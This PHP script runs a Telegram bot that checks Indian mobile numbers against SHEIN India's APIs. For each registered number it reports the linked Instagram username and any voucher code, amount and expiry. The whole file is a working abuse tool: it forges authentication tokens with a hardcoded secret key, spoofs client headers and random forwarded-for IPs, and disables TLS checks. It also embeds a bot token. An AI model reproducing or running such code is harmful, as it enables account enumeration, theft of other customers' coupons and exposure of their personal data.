<?php
// Telegram Bot Token - @BotFather se milega
$botToken = "7960314188:AAGL1yuQ6-jLGVCVcYwtgeL0aTvWHbM6shw";

// Check if cURL is available
if (!function_exists('curl_init')) {
    die("❌ cURL extension is not available. Please install/enable cURL in PHP.\n");
}

// Function to send message to Telegram using file_get_contents
function sendMessage($chat_id, $text) {
    global $botToken;
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = [
        'chat_id' => $chat_id,
        'text' => $text,
        'parse_mode' => 'HTML'
    ];
    
    // Use file_get_contents as fallback
    $options = [
        'http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/x-www-form-urlencoded',
            'content' => http_build_query($data)
        ]
    ];
    
    $context = stream_context_create($options);
    $result = @file_get_contents($url, false, $context);
    
    return $result;
}

// Function to make HTTP request without cURL
function makeRequest($url, $method = "GET", $data = null, $headers = []) {
    $options = [
        'http' => [
            'method' => $method,
            'header' => implode("\r\n", $headers),
            'timeout' => 10,
            'ignore_errors' => true
        ],
        'ssl' => [
            'verify_peer' => false,
            'verify_peer_name' => false
        ]
    ];
    
    if ($method == "POST" && $data) {
        $options['http']['content'] = $data;
    }
    
    $context = stream_context_create($options);
    $result = @file_get_contents($url, false, $context);
    
    return $result;
}

// Main function to check SHEIN number
function checkSheinNumber($number) {
    $ip = mt_rand(103, 150) . "." . mt_rand(0, 255) . "." . mt_rand(0, 255) . "." . mt_rand(0, 255);
    $adId = substr(md5(uniqid()), 0, 32);
    
    // Step 1: Get access token
    $url1 = "https://api.sheinindia.in/uaas/jwt/token/client";
    $headers1 = [
        "Client_type: Android/29",
        "Accept: application/json",
        "Client_version: 1.0.8",
        "User-Agent: Dalvik/2.1.0 (Linux; U; Android 12; SM-G991B Build/SP1A.210812.016)",
        "X-Tenant-Id: SHEIN",
        "Ad_id: $adId",
        "X-Tenant: B2C",
        "Content-Type: application/x-www-form-urlencoded",
        "X-Forwarded-For: $ip"
    ];
    
    $data1 = "grantType=client_credentials&clientName=trusted_client&clientSecret=secret";
    
    $result1 = makeRequest($url1, "POST", $data1, $headers1);
    
    if (empty($result1)) {
        return "❌ API Connection Failed";
    }
    
    $json1 = json_decode($result1, true);
    if (!$json1 || !isset($json1['access_token'])) {
        return "❌ Token Generation Failed";
    }
    
    $access_token = $json1['access_token'];
    
    // Step 2: Check account
    $url2 = "https://api.sheinindia.in/uaas/accountCheck";
    $headers2 = [
        "Authorization: Bearer $access_token",
        "Requestid: account_check",
        "X-Tenant: B2C",
        "Accept: application/json",
        "User-Agent: Dalvik/2.1.0 (Linux; U; Android 12; SM-G991B Build/SP1A.210812.016)",
        "Client_type: Android/29",
        "Client_version: 1.0.8",
        "X-Tenant-Id: SHEIN",
        "Ad_id: $adId",
        "Content-Type: application/x-www-form-urlencoded",
        "X-Forwarded-For: $ip"
    ];
    
    $data2 = "mobileNumber=$number";
    
    $result2 = makeRequest($url2, "POST", $data2, $headers2);
    
    if (empty($result2)) {
        return "❌ Account Check Failed";
    }
    
    $json2 = json_decode($result2, true);
    
    if (!$json2) {
        return "❌ Invalid Response";
    }
    
    if (isset($json2['success']) && $json2['success'] === false) {
        return "❌ The number is not registered";
    }
    
    $encryptedId = $json2['encryptedId'] ?? '';
    if (empty($encryptedId)) {
        return "❌ No Account ID Found";
    }
    
    // Step 3: Get SHEIN token
    $payload3 = json_encode([
        "client_type" => "Android/29",
        "client_version" => "1.0.8",
        "gender" => "",
        "phone_number" => $number,
        "secret_key" => "3LFcKwBTXcsMzO5LaUbNYoyMSpt7M3RP5dW9ifWffzg",
        "user_id" => $encryptedId,
        "user_name" => ""
    ]);
    
    $headers3 = [
        "Accept: application/json",
        "User-Agent: Dalvik/2.1.0 (Linux; U; Android 12; SM-G991B Build/SP1A.210812.016)",
        "Client_type: Android/29",
        "Client_version: 1.0.8",
        "X-Tenant-Id: SHEIN",
        "Ad_id: $adId",
        "Content-Type: application/json; charset=UTF-8",
        "X-Forwarded-For: $ip"
    ];
    
    $url3 = "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/auth/generate-token";
    
    $result3 = makeRequest($url3, "POST", $payload3, $headers3);
    
    if (empty($result3)) {
        return "❌ SHEIN Token Failed";
    }
    
    $json3 = json_decode($result3, true);
    
    if (!$json3 || empty($json3['access_token'])) {
        return "❌ Invalid SHEIN Token";
    }
    
    $shein_token = $json3['access_token'];
    
    // Step 4: Get user data
    $url4 = "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/user";
    $headers4 = [
        "Authorization: Bearer $shein_token",
        "User-Agent: Dalvik/2.1.0 (Linux; U; Android 12; SM-G991B Build/SP1A.210812.016)",
        "Accept: */*",
        "Content-Type: application/json",
        "X-Forwarded-For: $ip"
    ];
    
    $result4 = makeRequest($url4, "GET", null, $headers4);
    
    if (empty($result4)) {
        return "❌ User Data Failed";
    }
    
    $json4 = json_decode($result4, true);
    
    // Try gzip decode if json fails
    if ($json4 === null) {
        $uncompressed = @gzdecode($result4);
        if ($uncompressed !== false) {
            $json4 = json_decode($uncompressed, true);
        }
    }
    
    if (!$json4 || !isset($json4['user_data']['instagram_data']['username'])) {
        return "❌ No User Data Found";
    }
    
    $username = $json4['user_data']['instagram_data']['username'] ?? 'N/A';
    $voucher = $json4['user_data']['voucher_data']['voucher_code'] ?? 'N/A';
    $voucher_amount = $json4['user_data']['voucher_data']['voucher_amount'] ?? 'N/A';
    $expiry_date = $json4['user_data']['voucher_data']['expiry_date'] ?? '';
    $min_purchase = $json4['user_data']['voucher_data']['min_purchase_amount'] ?? '';
    
    // Check if coupon exists
    if ($voucher !== 'N/A' && !empty($voucher) && $voucher !== '') {
        $message = "✅ <b>COUPON FOUND!</b> ✅\n\n";
        $message .= "📱 <b>Number:</b> $number\n";
        $message .= "📸 <b>Instagram:</b> $username\n";
        $message .= "🎫 <b>Voucher Code:</b> <code>$voucher</code>\n";
        $message .= "💰 <b>Amount:</b> ₹$voucher_amount\n";
        $message .= "💵 <b>Min Purchase:</b> ₹$min_purchase\n";
        $message .= "📅 <b>Expiry:</b> $expiry_date\n";
        $message .= "🌐 <b>Checked At:</b> " . date('Y-m-d H:i:s');
        
        return $message;
    } else {
        return "✅ Account found but no coupon available\n📸 Instagram: $username";
    }
}

// Main script - Long polling for Telegram messages
function main() {
    global $botToken;
    
    echo "🚀 SHEIN Coupon Bot Started...\n";
    echo "Press Ctrl+C to stop\n\n";
    
    $offset = 0;
    
    while (true) {
        // Get updates from Telegram using file_get_contents
        $url = "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset&timeout=30";
        
        $options = [
            'http' => [
                'timeout' => 35
            ],
            'ssl' => [
                'verify_peer' => false,
                'verify_peer_name' => false
            ]
        ];
        
        $context = stream_context_create($options);
        $response = @file_get_contents($url, false, $context);
        
        if ($response) {
            $data = json_decode($response, true);
            
            if (isset($data['result']) && is_array($data['result'])) {
                foreach ($data['result'] as $update) {
                    $offset = $update['update_id'] + 1;
                    
                    if (isset($update['message'])) {
                        $message = $update['message'];
                        $chat_id = $message['chat']['id'];
                        $text = $message['text'] ?? '';
                        
                        // Handle /start command
                        if ($text == '/start') {
                            $welcome = "👋 <b>Welcome to SHEIN Coupon Checker Bot!</b>\n\n";
                            $welcome .= "Send Indian mobile numbers to check for SHEIN coupons\n\n";
                            $welcome .= "<b>Example:</b>\n";
                            $welcome .= "<code>9876543210</code>\n";
                            $welcome .= "or\n";
                            $welcome .= "<code>9876543210 9123456789</code>\n\n";
                            $welcome .= "Bot will check each number and show results";
                            
                            sendMessage($chat_id, $welcome);
                        }
                        // Handle numbers
                        elseif (preg_match('/\d+/', $text)) {
                            // Extract all numbers from message
                            preg_match_all('/\b\d{10}\b/', $text, $matches);
                            $numbers = $matches[0] ?? [];
                            
                            if (empty($numbers)) {
                                sendMessage($chat_id, "❌ Please send valid 10-digit Indian mobile numbers");
                            } else {
                                $total = count($numbers);
                                sendMessage($chat_id, "🔍 Checking $total number(s)...\nPlease wait ⏳");
                                
                                foreach ($numbers as $number) {
                                    // Simple validation
                                    if (strlen($number) == 10) {
                                        $result = checkSheinNumber($number);
                                        sendMessage($chat_id, "<b>Number:</b> $number\n$result\n────────────");
                                        sleep(3); // Delay between checks
                                    } else {
                                        sendMessage($chat_id, "❌ $number is not a valid Indian number");
                                    }
                                }
                                
                                sendMessage($chat_id, "✅ Check complete!");
                            }
                        }
                        // Handle unknown messages
                        else {
                            sendMessage($chat_id, "❌ Please send mobile numbers only\n\nFormat: <code>9876543210</code> or <code>9876543210 9123456789</code>");
                        }
                    }
                }
            }
        }
        
        // Small delay to prevent CPU overload
        sleep(1);
    }
}

// Start the bot
main();
?>
